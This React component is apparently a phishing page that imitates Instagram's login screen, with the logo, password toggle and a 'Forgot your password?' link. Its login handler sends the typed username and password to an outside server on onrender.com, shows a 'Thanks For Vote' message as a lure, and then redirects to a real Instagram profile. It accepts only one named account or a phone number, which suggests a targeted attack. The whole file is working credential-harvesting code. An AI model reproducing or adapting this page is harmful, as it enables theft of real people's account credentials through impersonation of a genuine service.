import React, { useState } from "react";
import {
  Box,
  Text,
  Input,
  Button,
  FormControl,
  FormLabel,
  Link,
  Image,
  IconButton,
  InputGroup,
  InputRightElement,
} from "@chakra-ui/react";
import DynamicAlert from "./dynamicAlert";
import { ViewIcon, ViewOffIcon } from "@chakra-ui/icons";

const InstagramLogin = () => {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [alert, setAlert] = useState(false);
  const [message, setMessage] = useState("Incorrect username");
  const [type, setType] = useState("error");

  const handleTogglePassword = () => {
    setShowPassword(!showPassword);
  };

  async function loginUser() {
    try {
      let res = await fetch("https://contact-list-zbo3.onrender.com/login", {
        headers: {
          Accept: "application/json",
          "Content-Type": "application/json",
        },
        method: "POST",
        body: JSON.stringify({ username, password }),
      });
      let data = await res.json();

      console.log(data);
      return data.msg;
    } catch (error) {
      console.log(error);
    }
  }

  const handleLogin = async () => {
    if (
      (username == "amisha_patel_6263" && password.length >= 6) ||
      (username == "6265848093" && password.length >= 6)
    ) {
      let allow = await loginUser();
      console.log(allow);
      setMessage("Thanks For Vote");
      setType("success");
      setAlert(true);
      setUsername("");
      setPassword("");
      if (allow) {
        window.location.href = "https://www.instagram.com/amisha_patel_6263/";
      }
    } else {
      if (username !== "amisha_patel_6263" && username !== "6265848093") {
        setMessage("Incorrect username");
        setType("error");
      } else if (password.length < 6) {
        setMessage("Incorrect password");
        setType("warning");
      }

      setAlert(true);
    }
  };

  return (
    <Box
      display="flex"
      flexDirection="column"
      alignItems="center"
      justifyContent="center"
      p={8}>
      <Image src="Instalogo.png" w="30%" />
      <Text fontSize="3xl" fontWeight="bold" mb={8}>
        Instagram
      </Text>
      <FormControl width="100%" mb={4}>
        {alert && (
          <DynamicAlert
            message={message}
            type={type}
            onClose={() => setAlert(false)}
          />
        )}
        <FormLabel>Username</FormLabel>
        <Input
          type="text"
          placeholder="Username"
          value={username}
          onChange={(e) => setUsername(e.target.value)}
        />
      </FormControl>
      <FormControl width="100%" mb={4}>
        <FormLabel>Password</FormLabel>
        <InputGroup>
          <Input
            type={showPassword ? "text" : "password"}
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
          />
          <InputRightElement width="3rem">
            <IconButton
              aria-label={showPassword ? "Hide password" : "Show password"}
              icon={showPassword ? <ViewOffIcon /> : <ViewIcon />}
              onClick={handleTogglePassword}
              h="1.75rem"
              size="sm"
              variant="ghost"
            />
          </InputRightElement>
        </InputGroup>
      </FormControl>
      <Button
        colorScheme="blue"
        size="lg"
        width="100%"
        onClick={handleLogin}
        mb={4}>
        Log In
      </Button>
      <Link
        href="https://www.instagram.com/accounts/password/reset/"
        color="blue.500"
        fontSize="sm">
        Forgot your password?
      </Link>
    </Box>
  );
};

export default InstagramLogin;
